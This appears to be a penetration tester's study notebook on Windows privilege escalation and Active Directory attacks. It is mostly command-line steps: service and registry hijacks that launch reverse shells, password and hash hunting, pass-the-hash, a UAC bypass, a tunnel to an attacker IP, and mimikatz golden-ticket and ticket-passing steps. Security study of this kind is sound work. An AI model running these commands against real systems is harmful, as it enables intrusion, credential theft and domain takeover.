# Windows Methodology

## **Methodology**

## Basics

* Goal: Gain a shell as Administrator or SYSTEM
* SYSTEM is a default service account with the highest level of priv
* Resources - access/action set by ACL
  * Each ACL is made up of ACEs: relationship between an object/user, and a right.
* &#x20;Administrator Shells
  * Easy way: msfvenom
  * Admin-> SYSTEM use PSEXEC
* Enum Tools
  * winPEAS
    * \> reg add HKCU\Console /v VirtualTerminalLevel /t REG\_DWORD /d 1 (enables colors on command prompt)
    * new prompt
    * \> .\winPEASany.exe
  * Seatbelt
    * .\Seatbelt.exe all

### **Enumeration for PrivEsc**

* Check Whoami and net user \[user]
* Check for easy unpatched vulnerabilities

```
>wmic qfe get Caption,Description,HotFixID,InstalledOn
```

* Run winPEAS
* Run Seatbelt
* Try Payload all the things enumeration commands
  * Create checklist of the things tyou need to make an exploit work.
* Modify a service
* Ability to start/stop service
* Look at interesting files
* Registry and service exploits first
* Kernel exploits last

## **Techniques**

### **I**nsecure GUI

* Older windows versions can allow certain GUI apps to run with admin priv
* [https://www.hackingarticles.in/windows-privilege-escalation-insecure-gui-application/](https://www.hackingarticles.in/windows-privilege-escalation-insecure-gui-application/)

### Kernel Exploits

* Can be leveraged to perform actions as SYSTEM
* Enumerate version and find matchign exploits > compile and execute
* Tools
  * Windows Exploit suggester
  * Precompiled exploits - [https://github.com/Secwiki/windows-kernel-exploits](https://github.com/Secwiki/windows-kernel-exploits)
  * Watson - rasta-mouse - [https://github.com/rasta-mouse/Watson](https://github.com/rasta-mouse/Watson)
* Identification
  * \>whoami
  * \>systeminfo
  * \> wmic qfe get Caption,Description,HotFixID,InstalledOn #will list all installed patches
* Exploit Packs
  * [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
  * [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
  * [https://github.com/egre55/windows-kernel-exploits](https://github.com/egre55/windows-kernel-exploits)
  * [https://github.com/padovah4ck/CVE-2020-0683](https://github.com/padovah4ck/CVE-2020-0683)

### Service Exploits

* Service Commands
  * First lets get a list of services that are running on the target and thier permissions
    * \>accesschk.exe -uwcqv \*
    * \>accesschk.exe -uwcqv “Authenticated Users” \*
    * \> Get-WmiObject win32\_service | Select-Object Name, State, PathName | Where-Object {$\_.State -like 'Running'}
    * \>sc.exe qc \[name] -query service config
    * \>sc.exe query \[name] -query service status
    * \>sc.exe config \[name] \[option]= \[value] -modify config option of a service
    * \>net start/stop \[name] -start/stop a service
* Service mis-configs
  * Insecure Service Properties
    * Each service has an ACL to define certain permissions
    * Check: you must be able to change a service AND stop/start the service
    * \>.\winPEASany.exe quiet servicesinfo
    * Verify with accesschk
      * .\accesschk.exe /accepteula -uwcqv user \[service]
    * \>sc qc \[service]
    * If you can change the service, try changing the BINARY\_PATH\_NAME to that over your reverse shell
      * \>sc config \[service] binpath= “\”C:\PrivEsc\reverse.exe\\""
    * \>net start \[service]
* Unquoted Service Paths
  * Executables in windows can be run without their extensions
  * Some executables take arguments separated by spaces
  * Look for paths with spaces and no quotes
  * Check permissions for the service
  * Check for write permissions for each directory in the binary path
  * Create a reverse shell executable and name it to the file that would be inserted into the unquoted path.
  * _PTFM: Unquoted Service Paths - pg. 32_
* Weak Registry Permissions
  * Registry stores entries for each service
  * Since entries can have ACL's, they can be mis-configured and modify a services config.
  * Locate a weak registry entry > verify permissions with accesschk
  * NT AUTHORITY\INTERACTIVE - user group that all users are apart of
  * Overwrite the image path value in the registry, so the called executable in the service, points to your reverse shell
    * \>reg add HKLM\SYSTEM\CurrentControlSet\Services\\\[service] /v ImagePath -t REG\_EXPAND\_SZ /d C:\PrivEsc\Reverse.exe /f
* Insecure Service Executables
  * If the original service executable is modifiable, we ca**n** simply replace it with our reverse shell
  * Check for called files by services that are writable.
  * Double check that you can start/stop the service
  * Copy/overwite the reverse shell file on top of the weak file
* DLL Hijacking
  * &#x20;Often an exe will try to load functionality from a library called a DLL
  * What ever functionality the DLL gives, will be executed at the same priv as the service that loaded it.
  * If the DLL has an absolute path, it might give priv esc if its writeable by our user.
  * More common: if a DLL is missing and we have write access to a directory within the PATH that windows searches
  * Might require manual enumeration
  * Copy the target exe to your host dev and analyze the DLL
    * Run procmon > ctl+L > add new filter for your target dll
    * Look for Results “NAME NOT FOUND” to give the DLL location of the target
    * Create a reverse shell in a .dll named after the called dll file.
    * Copy/paste it to your target and place it in the Temp Directory

### Registry exploits

* Autoruns are configed in the registry. If you can write to an Autorun executable, you may get priv esc on restart.
  * \>.\winPEASany.exe quiet applicationsinfo
  * \>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  * Paste reverse shell program over vul executable
  * [https://www.hackingarticles.in/windows-privilege-escalation-boot-logon-autostart-execution-startup-folder/](https://www.hackingarticles.in/windows-privilege-escalation-boot-logon-autostart-execution-startup-folder/)
* AlwaysInstallElevated
  * MSI files are used to install apps. They run with the permissions of the user trying to install. You can run these with admin (elevated) privs. We can use this by creating a malicious MSI file containing a reverse shell
  * Check 2 registry settings. These must be present and enabled
    * HKLM\SOFTWARE\POLICIES\Microsoft\Windows\Installer
    * HKCU\SOFTWARE\POLICIES\Microsoft\Windows\Installer
  * \>.\winPEASany.exe quiet windowscreds
  * \> reg query HKCU\SOFTWARE\POLICIES\Microsoft\Windows\Installer /v AlwaysInstallElevated
  * Create a reverse shell in the .msi format
  * [https://github/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/always\_install\_elevated.rb](https://github/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/always\_install\_elevated.rb)
* [**Windows Privilege Escalation: Logon Autostart Execution (Registry Run Keys)**](https://www.hackingarticles.in/windows-privilege-escalation-logon-autostart-execution-registry-run-keys/)

### Passwords

* Several features store passwords insecurely, especially in the registry
* Stored Creds in Registry
  * Seach the registry for keys and values that contain “password”
    * \>reg query HKLM /f password /t REG\_SZ /s
    * &#x20;\>reg query HKCU /f password /t REG\_SZ /s
  * \>.\winPEADany.exe quiet filesinfo userinfo
  * Query Autologins
    * \>reg query “HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
  * Query Putty sessions
    * \>reg query “HKCU\Software\SimonTatham\PuTTY\Sessions” /s
  * Spawn a shell with new credentials
    * \#winexe -U ‘admin%password’ //\[targetip] cmd.exe
    * \#winexe -U ‘admin%password’ --system //\[targetip] cmd.exe
* Saved Creds
  * Windows allows users to save thier credentials to the system for use with the runas command
  * \>.\winPEASany.exe quiet cmd windowscreds
  * \>cmdkey /list
    * \>run savecred.bat to refresh list of saved credentials
  * \>runas /savecred /user:admin C;\reverse.exe
* Config files
  * Some config files will store admin creds
  * Unattend.xml - for automated setup of windows
  * Search for filenames: sysprep.inf, unattended.xml, sysprep.xml
  * Recuresively search for files in the current dir with “pass” in the name, or ending in .config
    * \> dir /s \*pass\* == \*.config
  * Recuresively search for files in the current dir with “password” in the name, and end in .xml, .ini, or ,txt
    * \> findstr /si password \*.xml \*.ini \*.txt
  * \>.\winPEASany.exe quiet cmd searchfast filesinfo
* SAM
  * This is where windows stores password hashes
  * They are encrypted with a key that can be found in a file named SYSTEM
  * If you can read both SAM and SYSTEM you can extract the hashes.
    * Located in C:\Windows\System32\config
    * These are locked while windows is running
    * Backups might exist in C:|windows\Repair or C:\Windows\System32\config\RegBack
  * pwdump tool - part of creddump7
  * Look at the NTLM hash - If the last section starts with “31d6c” this indicates the password is empty, or the accoutn is disabled.
  * Crack the admin user hash with hashcat
* Passing the hash
  * Windows accepts hashes instead of passwords for a number of services.
  * We can use pth-winexe to spawn a command prompt using the admin users pw hash
  * \#pth-winexe -U " \[entire hash including LM hash] //\[target] cmd.exe
* [https://www.hackingarticles.in/windows-privilege-escalation-stored-credentials-runas/](https://www.hackingarticles.in/windows-privilege-escalation-stored-credentials-runas/)

### Scheduled tasks

* Admins can config tasks to run as other users or SYSTEM
* List all tasks your current user can see
  * \> schtassk /query /fo LIST /v
  * PS> Get-ScheduledTask | where {$\_.TaskPath -notlike "\Microsoft\*} | ft TaskName,TaskPath,State
* Check tasks and called files for when/if they are executed
  * \>echo C:\reverse.exe >> \[scheduled executable]
* Schedule a task that runs everytime the system starts
  * \> schtasks /create /tn \[taskname] /tr \[Taskrun] /sc onstart
* Schedule a task that runs when a user logs on.
  * \> schtasks /create /tn \[taskname] /tr \[Taskrun] /sc onlogon
* Schedule a taks that runs when the system is idle
  * \> schtasks /create /tn \[taskname] /tr \[Taskrun] /sc onidle /i \[1-999]
* Schedule a task that runs one
  * \> schtasks /create /tn \[taskname] /tr \[Taskrun] /sc once /st {HH:MM}
* Schedule a task that runs with system permissions
  * \> schtasks /create /tn \[taskname] /tr \[Taskrun] /sc onlogon /ru System
* Schedule a task that runs on a remote computer
  * \> schtasks /create /tn \[taskname] /tr \[Taskrun] /sc onlogon /s \[PC name]

### **UAC Bypass**

* fodhelper.exe attack
  * _PTFM: UAC Bypass - pg. 33_
  * This binary runs as high integrity on windows 10. We can leverage it to bypas UAC by the way it uses the Registry.
  * Run C:\Windows\System32\fodhelper.exe -> manage optional features -> inspect application manifest with sigcheck
  * \> cd C:\Tools\privilege\_escalation\SysinternalsSuite
  * \> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
  * next we look at fodhelper.exe while running procmon
  * Will generate a “NAME NOT FOUND” error and indicate an potential exploitable registry entry
  * fodhelper.exe attemtps to query HKCU:\Software\Classes\ms-settings\shell\open\command, which does not appear to exist
  * \> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
  * \> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG\_SZ
  * \> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
* Via Event Viewer
  * _PTFM: UAC Bypass - pg. 33_**j**

### Startup Apps

* Start up apps exist under each user as well as windows has a dir for all users
  * C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  * Files in here must be shortcut files
  * [https://www.hackingarticles.in/windows-privilege-escalation-boot-logon-autostart-execution-startup-folder/](https://www.hackingarticles.in/windows-privilege-escalation-boot-logon-autostart-execution-startup-folder/)
* Installed Apps
  * Look for exploits for specific installed applications via explotidb or searchsploit
  * Use tasklist or seatbelt
    * \>.\seatbelt.exe NonstandardProcesses
* Hot Potato
  * Attack that uxses spoofing and NTLM relay to gain SYSTEM Priv
  * Tricks windows to authenticating as the SYSTEM user to a fake HTTP server with NTLM.
  * Potato.exe exploit code binary exists!!!
  * Dont forget to compile the code wiht your reverse shell details
* Token Impersonation
  * Cannot log directly into service accounts
  * Rotten Potato - Service accounts to intercept SYSTEM ticket and use it to impersonate SYSTEM user
  * Service accounts
    * Generally configured with SeImpersonate/SeAssignPrimaryToken privileges
    * This allows the account to impersonare the access tokens of other users including SYSTEM
    * Any user with these privs can run teh toeken impersonation exploits found.
  * Juicy Potato - [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
  * Rogue Potato - [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
  * PrintSpoofer - [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* Port Forwarding
  * Sometimes its easier to run code on kali but the target is only listening on an internal port
  * Enter Plink.exe
  * winexe port connects with port 445
  * Setup
    * /etc/ssh/sshd\_config - make usre PermitRootLogin is set to Yes
    * \#service ssh restart
  * \>.\plink.exe root@\[attackerIP] -r 445:127.0.0.1:445
    * Forward remote port to local port
  * Now we run winexe at our local port on the attacker box, and plink sends it to the target, posing as an internal port
    * \#winexe \_u ‘admin%password’ //127.0.0.1 cmd.exe
* Kerberos Privilege Attribute Certificate vulnerability
  * With basic information on a domain user you can move to a domain admin by editing the PAC
    * \#git clone [https://github.com/bidord/pykek](https://github.com/bidord/pykek) /opt/pykek
    * \# apt-get install krb5-user
    * \# apt-get install rdate
    * \# rdate -n \[domain]
    * \# echo \[attacker IP]\[domain controller hostname] >> /etc/host
  * Next we need 4 pieces of information
    * \-u username@domain (user@domain1)
    * \-d domain controller \[domain.controller.test]
    * \-p password
    * \-s SID (get SID with command “whoami /user”
  * Now that we have all the pieces
    * \#cd /opt/pykek
    * \#python ms12-068.py -d domain.controller.test -u user@domain1 -s \[SID] -p \[password
  * We have created a credential cache ticket and now we copy it where it needs to go
    * \#cp TGT\_user@domain1.ccache /tmp/krb5cc\_0
  * Now you have access with
    * \#smclient -k -W domain1 //domain.controller.test/c$ -k
* Kerberos Pass-The-Ticket
  * Start with writing all tickets to the folder from wihch it was executed.
    * \>privilege :: debug
    * \>sekurlsa::tickets /export
  * Now we import one of those as our tikets and drop back into mimikatz
    * \>kerberos::ptt \[0,ab9bf] \[ticket info]
* Kerberos Golden Ticket attack
  * Creating your own tickets to Auth to any server
  * You can take the old krbtgt hash from the previous hash dump and promote yourself back to Domain admin, all with an unprivileged account
  * A few notes on krbtgt:
    * Do not reset the system generated password, it could break the whole domain
    * Even if you change every password for every domain admin, you can still become a DA
    * You can create Users and Groups that do not exist within the Golden ticket
  * What you need
    * Domain - on victim host type: whoami
    * Domain Admin user - On victim host type: net local group administrators /DOMAIN
    * Domain SID - whoami /user chop off the last dash and 4 digits
    * krbtgt - From previous hashdump, use the second half of the hash/the NTLM hash
  * Process
    * Run Smbexec, choose hashdump, and dump the domain controller
    * A log file will be created with the domain hashes. The one we need is the second part of the krbtgt hash
    * Return to original shell
    * Drop into mimikatz 2.0
      * use kiwi
    * Create golden ticket
      * \>golden\_ticket\_create -u \[domain admin suername] -d \[domain] -k \[krbtgt hash] -s \[Domain SID] -t \[location to Drop Golden Ticket]
  * Using the Golden ticket
    * Shell access with limited access
      * \>session -i
    * Load mimikatz
      * \>use kiwi
    * Check current Kerberos Tickets
      * \> kerberos\_ticket\_list
    * Purge all Kerberos Tickets
      * \>kerberos\_ticket\_purge
    * Local our Golden Ticket (stored in /opt/ticekt.txt in our vm)
      * \>kerberos\_ticket\_use /opt/ticket.txt
    * Drop into a shell and read files off the DC
      * \>shell
      * \> dir \ \DC\c$
    * Once we are authed using the Golden ticket, we can send Domain admin commands using WMIC
    * Example: execute a ping commmand and write that to a file on a remote server
      * wmic /authority:"Kerberos:\[attacker.domain] \\\[target hostname]" /node:\[target hostname] process call create "cmd /c ping 127.0.0.1 > C:\log.txt
* Overpass the Hash
  * Over abuse NTLM user hash to gain a full Kerberos TGT
  * The essence of the overpass the hash technique is to turn the NTLM hash into a Kerberos ticketand avoid the use of NTLM authentication. A simple way to do this is again with the sekurlsa::pth command from Mimikatz.
  * \#mimikatz # sekurlsa::pth /user:jeff\_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
* Impacket scripts
  * [GetTGT.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/getTGT.py) Given a password, hash or aesKey, this script will request a TGT and save it as ccache.
  * [GetST.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/getST.py) Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user.
  * [GetPac.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/getPac.py) This script will get the PAC (Privilege Attribute Certificate) structure of the specified target user just having a normal authenticated user credentials. It does so by using a mix of \[MS-SFU]'s S4USelf + User to User Kerberos Authentication.
  * [GetUserSPNs.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/GetUserSPNs.py) This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat.
  * [GetNPUsers.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/GetNPUsers.py) This example will attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set (UF\_DONT\_REQUIRE\_PREAUTH). Output is compatible with JtR.
  * [ticketConverter.py](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/ticketConverter.py): This script will convert kirbi files, commonly used by mimikatz, into ccache files used by Impacket, and vice versa.
  * [ticketer.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/ticketer.py) This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC) allowing you to customize some of the parameters set inside the PAC\_LOGON\_INFO structure, in particular the groups, ExtraSids, duration, etc.
  * [raiseChild.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/raiseChild.py) This script implements a child-domain to forest privilege escalation
* [**Windows Privilege Escalation: Boot Logon Autostart Execution (Startup Folder)**](https://www.hackingarticles.in/windows-privilege-escalation-boot-logon-autostart-execution-startup-folder/)

### Misc

* [**Windows Privilege Escalation: SeImpersonatePrivilege**](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/)
* [**Windows Privilege Escalation: DnsAdmins to DomainAdmin**](https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/)
* [**Windows Privilege Escalation: SeBackupPrivilege**](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
* [**Windows Privilege Escalation (AlwaysInstallElevated)**](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/)
* [**Windows Privilege Escalation (Insecure File Permissions)**](https://www.hackingarticles.in/windows-privilege-escalation-unquoted-path-service/)

## Specific Vulnerabilities

### [**CVE-2021-36934**](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934) **- HiveNightmare**

* [https://www.hackingarticles.in/windows-privilege-escalation-hivenightmare/](https://www.hackingarticles.in/windows-privilege-escalation-hivenightmare/)
